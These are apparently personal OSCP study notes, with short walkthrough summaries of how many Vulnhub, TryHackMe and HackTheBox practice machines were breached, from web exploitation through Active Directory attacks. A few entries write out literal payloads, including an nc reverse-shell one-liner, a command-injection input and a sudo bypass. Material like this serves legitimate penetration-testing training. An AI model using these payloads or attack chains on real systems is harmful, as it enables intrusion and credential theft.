## OSCP pre - writups for mahines in Vunlhub, THM, HTB ..

#### sar2html 13
suid, short bash shell

#### Natrj/18
file inclusion

#### sunset: dawn2/21

#### loly 25: 
wordpress, reverse shell; kernel exp

#### djinn3 29: 
SSTI get reverse shell, pspy to find cron job, use cron job to create credential to .ssh/authorized_keys, sudoers file for es

#### funbox2 30: 
ftp, ssh id_rsa; sudo -s

#### solid 35: 
25smtp, 110pop3; search suid file

#### sunset:
#### decoy:40: 
linux shadow decrypt, pspy

#### seppuku 62: 
ftp,139,445 smb, enum4linux(smb scanner), hydra ssh, ssh -i private key, sudo -l, bash -c -i

#### gaara 69: 
gobuster,2.3medium(if dirsearch found nothing), hydra ssh, suid (find / -type f -perm -u=s), pyhton os.execl

#### sosimple 71: 
wpscan --enumlate , and -u bruteforce, plugin “social warfare.” rce to get shell, sudo -l, service sudoer.

#### Y0usef 74: 
site-proxy bypass,upload file filter bypass, php shell, linux 3.13 exploit.

#### doom: 
json unsearialize vuln of webapplication, rce; ps -aux to find process is running on root privi; sudo -l, tcpdump to escalate privi.

#### evil:one: 
  fuff-find parameter of web::cat the .ssh-id_rsa from web url::find p@asswd editable：：generate linux passwd file content::
#### dc-9
  sqli, LFI, port knock 22, sudo -l, add suer with root privi to passwd
#### pwned1
  dirsearch with medium dirc|| ssh -i || es: group, docker -v /:/media  chroot
#### tr0ll
  dirsearch with medium dirc, .pacp searching, hidden direc and again and ag, get id and passwd list, hydra ssh, ubuntu kernel vuln
#### photographer
  139/445 smb, php reverse shell, file upload(modify suffix to by pass front end format check), esclate privi suid  php7.2
#### born2root
  joomla, cewl to get psswd.txt to bruteforce the joomla login page:: hydra or burp s used, a powerful tool I need here:: joomla templates, modify with php reverse shell:: folder searching, for abnormal folder and files :: sudo -l:: nc -e

#### gitroot
  wordpress, git folder(GitTools- dumper,finder), suid git
#### born2root1
  privatekey not accept(PubkeyAcceptedKeyTypes=ssh-rsa), cat /crontab
#### raven 1
  wpscan --username to brute f the passwd, showmount for rpc, sudo -l- python to es
#### ha-waordy
  wpcan --username bruteforce to identify plusgins, use vuln to esclate scrf as aarti, get the useful infor of admin passwd, modify template page as reverse shell page, es: suid cp, create new user with 0:0 root, cp to overwrite passwd, su newuser.
#### raven-2
  phpmailer vuln remote code ex, if mysql is used, check wp-config for root passwd. fail to es
#### bottleneck
  dir big dirc,php reverseshell uploaded to get shell, sudo -l to su a nromal user shell, 
#### sunset1
  ftp, john the reeper to crack shadow passwd, sudo -l, ed
#### sunset-midnight
  3306 mysql hydra root/passwd; update passwd value in mysql; upload on line php reverseshell in wp, by adding upload plugins; check wp-content wp-config.php to get localhost passwd; fing -perm -u=s; export $PATH;
#### joy
  many ports open, 21 ftp, nmap -sU udp scan, tftp vuln, sudo -l , change the privi of passwd, openssl to gen new passwd line, add new user to passwd with /root/bin/bash shell;; telnet 21 port, site cpfr and cpto to move file into the host.(for sv of ptoftpd- http://www.proftpd.org/docs/contrib/mod_copy.html)
#### dc-4
  bruteforce on admin/ burp is slow, hydra not reliable; burp repeater to modify http request; tomcat setting file,; sudo -l add new user into /etc/passwd
#### fall
  dirsearch test.php,requires a get parameter; LFI, wfuzz to get the patameter; LFI the passwd and .ssh of bash user; ssh -i id_rsa; history, echo "x" | sudo -S xxx.
#### mercy
  139 share files; knock http and ssh; rcp vunl; tomcat server conf file dirc and user passwd leakage; tomcat .war file reverseshell by msfvenom; root privi of a file;
#### fristlink
  dirc info from page;f12 to view useful info; baes64  to image;php reverseshell with subfix .png; info searching, file rpivi; use rpvi to change privi of folder and files; sudo -l
#### hack_me_please
  view page source code to get hidden file and dirc; find seeddms application; google the setting page and accessible; get the ID and passwd of DB; get host user/passwd and seeddms ID/passwd; update the passwd of DB if cannot crack; vuln of seeddms; sudo -l
#### DerpNStink
  web dirc,wp plugin vuln- get shell; wp-config.php get mysql passwd;mysql get wp-admin login and host account passwd;sudo -l
#### deveguru
  .git didrc leakage, gittool to get the git file by git dumper to download and git extractor to restore to normal files; get the db credential; login web server backend; htm file RCE method, wget reverse shell to load it via web browser; searching for abnormal file - backups; get gitea db credential; gitea githook to launch hook shell(system bash shell); sudo -l sqlite3 but without passwd; sudo version , vuln; sudo -u#-1;
#### tommyboy
  wp user brute force; photo exiftool to veiw info; hidden port , not always open; fuff to find hidden file on web; crunch to generate word list;fcrackzip to crack zip passwd;wp apperance template fule php reverse shell; find dirc with writable privi;ilovecody112235! 

#### RickSanchezEasy
  web ping page 127.0.0.1|id ; crunch to create wordlist; hydra ssh://xxxxx:port; sudo -l
#### tiki
  139 port, --shares; 80, tiki vuln auth bypass; get ssh crendential; sudo -l;
#### breach1
  use .keystore to decrypt wireshark file, types of keystore file; burpsuite tomcat management page, deploy war reverse shell; sudo -l
#### healthcare
  seclist-big wordlist to search dirc; vuln of openemr, or use sqlmap to inject db; php page reverse shell; u=s file, is executable, with a command, user PATH to trick teh command to run local PATH with '/bin/bash' in it get the ES
#### breach2
  ssh a port to enable http service; xss vuln, use beef to hijack the browser, and add reverse shell to get shell; good to stick the backdoor by modifying the .sh; conditions to enable more port, like 2323 and switch to anohter account to enbale 8888; upload reversesehll php; sudo -l tcpdump;
#### bob
  web remote code execute from web page, got a shell; gpg file decryption with passphrase; sudo -l
#### weakness
  add hosts mapping; openssl vuln, get private key; python pyc file deconplier; sudo -l
#### toppo
  web enumerate a passwd and guset the name; suid python,mawk
#### goldeneyes
  pop3 protocal, telnet to RETR emails; exifitool to view photo hidden info; web reverse shell for system path; kernal exploit, cc replace gcc, if gcc is not allowed;
#### nullbyte
  index pic exiftool for commit info- that might be passwd, directory, hash or encoded strings; one field input box hydra bruteforce; sqlmap; decoded words, try more methods, you will find the truth; u=s, $PATH to trick the script to run a file located in the current folder, it can be /bin/sh or /bin/bash. with s privi
#### pre-oscp
  id_rsa, ssh -i as oscp; u=s
#### lemonsqueezy
  wpscan id bruteforce; phpmyadmin wrtie command into outfile in query aommand to add a php?cmd= page for remote code execution; crontab to esclate privi
#### misdirection
  webshell- direct user; sudo -l to aother user on host; privi to write to /etc/passwd; openssl to generate crendential and add a user to /etc/passwd with 0:0:0 privi
#### brainpan
  .exe file, hte only path; bufferoverflow; sudo -l, manual (why ! before commands)
#### hackerkid
  source code hint;wfuzz ?parameter=FUZZ;dig domainname @IP(to get subdomain);SSTI to view .bashrc of passwd and id of 9999 port; SSTI of 9999 port lauch a reverse shell;ed- process injectrion
#### besidesVancouver
  wpscan brute force ID; themes edior with php re sehll;crontab for es
#### hackme1
  sqli get the auperadmin; php reversehll upload;a abnormal file to get id 0;
#### hackme2
  sqli like hackme1; c coded , input box, system("id"), indicates developed by C; system(base64_decode("payload") to bypass cannot type blank); rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.129 8821 >/tmp/f (nc for revershell cannot user -e);
#### zico2
  phpLiteAdmin v1.9.3 default passwd admin; exploit  Remote PHP Code Injection to get a shell; enumerate zico home folder/wp-config get host passwd; sudo -l
#### kiopreix2
  web page ping app with python reverse shell toget a shell;kernel vuln
#### sickos
  proxy set to the target machine as it has a proxy running on a port; robots.txt, default id/passwd, upload shell php; config.php get a passwd, works for account of OS; sudo -l
#### vulnos1
  phpmyadmin default id/passwd root/toor;dvwa cmd get a shell;----
#### lin.secu
  nfs mount remote files on local sys; useradd name of remote with uid 1001; mkdir .ssh cp pubkey to authorized_keys; ssh -i
#### pwnlab
  vuln of PHP ?xx=payload to view the source code if web page; mysql -h remote; upload restriction by pass, extension and add GIF87a at the beggining; change $PATH if a executable file not use /bin/xx only xx;for echo script, use && to excute bash like xx && /bin/bash or /bin/sh
#### Mr-robothttp://10.10.77.158/wp-admin/theme-editor.php?file=index.php&theme=twentyfifteen&scrollto=408
  hydra to brute force username and then passwd!!!; comad to get uniq items in a text file; sudo -l nmap
#### skytower
  sqli if 'or' '=' is filtered, use || , > < instead; port 22 is filter by proxy, use proxytunnel to ssh; .bashrc details, if abnormal ,delete it; sudo -l with ../ in the dir 
hydra
#### alfred_rhm win
  genkins default passwd/user; porject with OS comand function, msfvenom create revershell and with command downlaod and run exe file; build it and run; get shell, es to meterpreter shell; list priv of current account, with debugger and impersonate privi; impersonte service token useing msf 'inicognato' module;

#### hackpark
  more about hydra, with additional body strings from Burps; app vuln to uplaod msf reverseshell ; msf handler; replace teh exe file to es

#### gamezone
  port80 sqli;ssh, ss find open session; ssh -L to forward the traffic to visit the port; app vuln use msf get root 

#### skynet
  smb anonymous; bruteforce http-post-form; smb with crndential;new web folder; cuppa exploit CVE- launch reverse shell; suspicious .sh file, wildcard injection;

#### Daily Bugle
  joomla scan, vuln; sqli vunl, use sqlmap or google for some script or method for a vuln; hashcat to bruteforce passwd; joomla template edit php file to get shell; web configure file, get sql root and passwd; this passwd also works for only user of host!!!!!sucks but remember;sudo -l

#### mrrobot-thm
  info enemulate of dir, wp page, find id and passwd of wp; thme index editor, php revershell; home/robot get password; suid nmap without sudo privi
#### relevant.thm
  smb put priv; put .aspx file into win server to get revershell shell; try http port to view smb dir; view smb file in th host; vuln to es

#### smol.thm
  wpscan -e ap to identify plugins; cve of this plugin LFI, view wp-config; wpscan not indentify other plugin,but from info in the site 'hello dolly';exploit hello dolly get a CMD parameter; get backdoor;lateral to oitehr user by viewing .ssh pri key; aga lateral, view /etc/pam.d/su; zip2john and john bruteforce zip with passwd; credntial of last one; sudo -lilovecody112235! 

#### Devie.thm
  source code of python, search for vuln function, eval; revershell, base64 and xor - utf8 encode;  cp * plus --preserve=mode to privi es

#### ad.thm
  139,445 3389,53 open; kerbutef to iditify user in this domain; impacket-GetNPUsers -no-pass , to get credential of this account; netexec and smbclient to get shared files -- another credential of backup account; backup can enum all ntlm hashed, using impacket-secretsdump ; use admin hash, evil-winrm to pas the pass to login the host with admin privi;

#### wonderland.thm
  dir enum get a passwd; sudo -l, creTraverxecate python lib under the current folder to be  misused by .py file, get a shell of the owner of .py; with suid file, use a 'date' function in side, create a malicious new one, with os.system('/bin/bash'), and exprot PATH, get a shell of another user; linpeas idenitfy capability, /usr/bin/perl5.26.1 = cap_setuid+ep

#### editor.htb
  xwiki vuln get a shell; xwiki config file, hibernate.cfg.xml, get a credential; cre reuse to ssh uer of host; ndsudo with suid to privies

#### puppy.htb
  rpc to identify users on this host; bloodhound search for privi of given account, and add user to DEV group can write DEV group; netexec with new privi to view share files, get kdbx file; keepass4brute to recover the data, get password list; users and psswds, use netexec smb to brute force paired id/passwd, get a new pair; blodhound search for thisnew user, not enabled- ldapsearch;  bloodyAD to reset passwd,ldapsearch to enable; evil-winrm login host and get user flag, backup file of anohter plain crendential; for the new user, we find masterkey and credential pair for DPAPI; use impacket-dpapi decrypt the paswd of the pair, which is a adm account, with all privi;

#### fluffy.htb
  smb vuln to get a new credntial hash; john getthe plain passwd, bllodhound to view privi- add to the group and get another 3 accounts shadow cert, whihc is ntlm hash, ensure vync time to the target dc; use vertipy-ad find vuln of DC. get ESC16 vuln, imperson the admin account to retreive the hash of admin; evil-winrm login as admin;

#### tombwatcher.htb
  with given account, account lateralmove; writeSPN privi, targetedKerberoast.py to get the hash of target you have privi;addself privi,ReadGMSPassword, gMSADumper.py to get hash of target account; forcechangepassword, change passwd of taget by useing bloodAD with -p hash;writeOwner privi, add owner to target, with own privi use impacket-dacledit grant fullcontrol privi, then reset target passwd, get user.txt; Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects, search deledted account;Restore-ADObject  and Enable-ADAccount, then rteset the passwd Set-ADAccountPassword; with this privi account, find vuln of AD, certipy-ad find ; esc15 to get root;

#### voleur.htb
  ntlm login is not allowed, so that cannot pass the hash. use impacket getTGT to get ccache of the given user, use ccache file to login smb server; get a xlsx file locked, use office2john and john crack it; get info of users and service account; workingwith bloodhound, use a svc-ldap id to get the ccache, and use targetedKerberoast.py to get the hash of passwd, and use john to get plain text of passwd; same way to deal wirth svc_winrm ,get TGT to get ccache file to login using evil-winrm; get user txt; from BH this accounbt has backup privi, use get-adobject to indeitify del users; get todd; use get-adobject to restore it and; getTGT to get ccache file and use impacket-smbclinet -k to use ccache to login smb; get some dpapi masterkey and credential , rerstore it using impacket-dpapi credential; also use getTGT to loogin with this id to smb; get ntds.dit and SYSTEM, to find all crendentials of AD;

#### Artificial.htb
  docker build from dockerfile; sqlite3 to select .db; restic to backup host file

#### bashed.htb
  dir search, get web bash page; find files or folders owned by a user, sudo -l ALL for this user;pspy64 to indentify crontab job; create py reverse shell into the folder, get root shell

#### beep.htb
  tls version not support by browsr, modify about:config of firefox to support tls1.0; cve of Elastix to IFI; get user txt and admin passwd; use as root of host to ssh; ssh DF algriths not support, modify .ssh/config: KexAlgorithms +diffie-hellman-group1-sha1 \n\r Ciphers +aes256-cbc, ssh -v -o HostKeyAlgorithms=+ssh-rsa root@10. //to support rsa

#### nineveh.htb
  enumerate http and https; hydra login page, -l none wihout username; app vuln to create a web shell; also app LFI, with specific key 'work' to incluion file; linpeas notice knock port 22, with id-rsa login as user; pspy64 notice routine job, with vuln, get root

#### valentine.htb
  heartbleed vuln to get base64 code -> a password; /dev page get a key, cat hype_key | xxd -r -p,openssl rsa -in /home/ed/id_rsa -out id_rsa.out to decode and decrypt key file used for ssh -i; ssh -i enable rsa ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -i key; tmux privi es, /.devs/dev_sess, linenum to check the active shell;

#### poison.htb
  LFI, get setc/passwd, and a passwd for charix, ssh to host;for freebsd socketstat and ps -aux identify a root process running vncserver on a local port; port forward this port; from a zip file, use vnc decryption to get vnc passwd, vnc RDP to root v desktop

#### node.htb
  check js file in develooper tool, for api website;controllers/admin.js indicates admin ot web page; get a backup.zip,john it; get a id/passwd for ssh; user.txt, mongosb, mongo -u xx -p xx tablename; insert a revershell; linpeas.sh find the routine taks of mongdb, get shell of new user; -u=s file, backup , strings, and ltrace it to view and guess the logical; $Home track to pas the filter; backup /root folder

#### friendzone.htb
  port 139, get a credential for a web admin; as 53 port is open, dig to identify subdomains; enumerate dir of new subdomain; exploit LFI of the test page to inclusion a php reversehll put by smb, the path is /etc/development/filename; get user shell, find a conf file with a credential, which is for a user with bash, ssh it; pspy and linpeas get a routine job of root, but hte file wrote by py is not writable, inside the py file, import libn file is writable by all user; add py reversehll in the lib file, get root

#### swagshop.htb
  application CVE,search for CVE is also time to enumerate, some script wriote by py pl, the error code may indicate where to modify the source code; RCE to exec reverse shell, try various ones, may succeed once; sudo -l, vi (/  dir maight be . or /var/www/html/*) suid

#### networked.htb
  view php source code; upload file, with privi to edit preview pic; code injection a pic with using exiftool, without changing MIME TYPE; user txt, php review, echo base64 -d | sh to pass malicious code into file name; root, kernel vuln of input validation 

####jarvis.htb
  sqli, to detect sqli from order by error, not alway from ' or 1=1; phpmyadmin query injcetion, get web cmd start reverse shell to host; sudo -l, ping command injcetion, with bypass blacklist $(script); systemctl suid

#### popcorn.htb
  upload file, torrent file create; exiftool to add code into img file as revershell; vuln of kernel

#### mirai.htb
  default passwd used as host user;/root dir backup to usb driver, many ways to recovery del file in usb

#### Optimum.htb
  vuln of app get a shell; vuln of win get root. 

#### granny.htb
  nmap find more options for http-webdav app, PUT ,MOVE, ..; davtest to verify the extention for put;cadaver to put aspx cmd page or revershell to server; ms10-15 boring exploit

#### bounty.htb
  upload identify extention filer,web.config conde injection for RCE; ms10-xxx boring

#### forest.htb
  ldapsearch cn sAMAccountName to find all user name or enum4linux;  impacket-GetNPUsers to indentify user 'Kerberos pre-authentication disabled can be cracked' to get windows hash of this user; evil-winrm login;
bloodhound/sharphound in win to get AD info and attack path; add new user in domain, add to a specific group, add dcsync to suync all hashes in AD;secretsdump Impacket to get hash; impacket-psexec or evil-winrm use hash to login as admin

#### bastion.htb
  smbclient with guest get backup image of OS; use mountto mount folder remote to local; guestmount --add the vhd file to view locally; get NTLM hash of users; john crack it; enumerate saftwre installed, google it , find the vuln of insexure credential stored; github srcipt to decript the password of Admin

#### secnote.htb
  signup account as ' or 1=1 to SQLi to db, get a credential; use this credential to login smb, put cmd.php, visit cmd on port 8808; get a user shell; find wsl ubuntu instance, bash historty find the admin credential, psexec to login as system

#### buff.htb
  vuln to get a shell; shell is limited, smb transfer nc to programdata, nc a shell; winpeas and netstat find a listening port, and the applcation behind it; chisel to portforward this port to localhost; vuln of buffoverflow of this app, to get system

#### active.htb
  mbclient -L 10.10.10.100 -N to list dir;smbclient //active.htb/Replication -U "%" to login smb; get cpassword, gppdecrypt to get plain passwd;impacket-GetUserSPNs to find vunl account; hashcat -m 13100 to crack passwd; impacket-psexec to rpc login to host

#### remote.htb
  nlockmgr service as NFS to mount remote disk to local; from the backup dir find admin credential; login CMS web server; this is umbraco service with vunl to RCE; smbserver transfer nc to target, get a user shell;es m1, whoami /privi ,SeImpersonatePrivilege, use godpotato to es; m2 tasklist to list all process, find teamviewer;chekc register HKEY to find base10 AES encrypted passwd; use a scipt to get plain text as the passwdof admin;

#### blocky.htb
  dir search, get .jar files; jd-gui view sourcecode of .jar file, get a password of phpmyadmin, also used as hsot user passwd;sudo -l ALL ALL ALL

#### traverxec.htb
  vunl of RCE; enum the priv of a folder from conf file of service; get id_rsa, john crack the passphase; sudo privi of a binary in the home folder; journactl plus less to es!!!!

#### postman.htb
  redis without auth, way to get shell of redis user, tried cmd.php to server, and add id_rsa to folder of redis, login as redis; find id_rsa bak of A user, crack the phasepass as passwd;webmin vuln to root, since webmin run by root

#### openadmin.htb
  vuln of ona RCE get a shell, updatge shell; check db config file of service, get a passwd, reused as user on the host; indentify a port is open, and find a privi web service running it; local port forwarding, access it and get a ssh key of another user; sudo -l, nano, es 

#### bart.htb
  ffuf exclude response length to scan dir; curl to post data to service to signup user; use burp post payload CMD page;download nc and get a shell- here since the cmd is webpage, encode the command by urlencode;swtich userin in windos, net use

#### magic.htb
  main page can be bypass by 'or1=1# in user_name, enter upload image page; upload shoud meet 2 requirements: extention and magicbyte. ; use vim add php payload into PNG file without changing MIME type,, donot add \n in the data; get a shell, check dbconfig file, get a credential, but cannot use to ssh, su it to user; a binary run by root but can be read and execute by user, path manuplate and make a fake binery to run as root to ES 

#### tabby.htb
  port 80,LFI; from enum of port 8080, LFI user config of tomcat,get a credential, but not useful in manager of tomcat;vuln of tomacat upload war file (zip .war), we can uplaod cmd or reversehll, get footholder; backup file, user base64 and decode base64 to transfer files, get user; lxd group to es;

#### admirer.htb
  enum port 80, get a credential for ftp;ftp get backup file,and db info;cannot access db via remote http; build mysql local use target machine adminer app to login local db; a vuln of adminer to query remote db info, load data command to fetch web page to db, get user credential; sudo -l all for a .sh, python lib jijacking for root

#### doctors.htb
  add hosts,enum dir of ports, a post page wrote by python, try SSTI, get a shell; linpeas get a password, try shaun, only user; splunk es

#### love.htb
  enum, vie cert of tls, get domain name, add it into hosts; access to a searching file system,with server-side request forgery (SSRF) exploit; http://127.0.0.1:5000, to view the page with local privi, get a crendential for another app; this app vuln exploit to get a shell; es for  AlwaysInstallElevated set to 1 in HKLM!

#### Editorial.htb
  app vulnerable to SSRF, test by nc a port, then fuff to check 1-65535 port on the target machine, got 5000 is diff; access this port, get a credential, ssh as a user; lateral move by enum .git, use dumper to restore git log, find another credential; sudo -l, a py file, with vuln, to es

#### omni.htb
  port scan, research on abnormal ports, get info and vunl; run the vunl get foothold, system shell, fetch hive(SAM,SYSTEM), or some hidden file on host to get credential, login into http service port 8080, get reversesehll; powershell encrypt file get flags

#### Timelapse.htb
  smb guest allowed, get pfx file; extrace pfx to crt and key, used to evilwinrm login; powreshell history to lateral move;net user check group, LAPS_Readers

#### office.paper
  use burp to get response header - domainname; wordpress version vunl, infor leakage, to a new app; help of robot, run command to read unpriv files , get a credential; use to ssh a user; polkit version nul to ES

#### pandora.htb
  port scan udp; snmp. snmpbulkwalk, get a credential; ssh to host, check apache config under /etc/apache2/sites-enabled/, get another service running, local access only; port forwarding, visit it; service version with a vunl, get  a shell for another user; find -u=s, path hijack to ES

#### previse.htb
  App redirecting requires login, try EAR;Burp proxy- match and replace to access the hidden files; php source code, find exec(), code hijack; mysql get response in one line by using -e; sudo -l, path hijack

#### knife.htb
  response header check X-powered-by, php version vuln of RCE; sudo -L

#### Armageddon.htb
  burp catch response header X-Generator Drupal 7, with vunl RCE, get a shell; web config file inof leakage, get db crendential; quire db get user credential; sudo -l, sudo ALL snap, failed ES

#### Horizontall.htb
  framework dev web, check js file, get a subdomain; dir enum, get a app and version with RCE vunl; uer shell, check listening port, host only; portforwarding, serivce with vuln of RCE, php unserialize. get root shell 

#### ScriptKiddie.htb
  msfvenom web app has vunl, get a shell; risk script collect info with a file compromised use has w privi; put payload into this file to make nmap $(payload - revershell shell), lateral move; sudo -l

#### delivery.htb
  service http enum; for ticket management system, ticket trick to view the verify email which only be viewed for inertnal mailbox; get user, search config of all http services, get db creential; hashcat root by hashcat rule attack use best66, get root

#### ready.htb
  gitlab vunl to get user shell; search gitlab config, get root passwd, su to root; notice we root the container, check docker-compose file, has privi :true; mount host disk to container; generate ssh key to root/.ssh, ssh -i 

#### passage.htb
> app vuln get web shell; applcation folder enum to lateral move , ssh key reuse lateral again; user group and .viminfo point to a software we can lauch to write ssh pub key to root/.ssh/; ssh as root
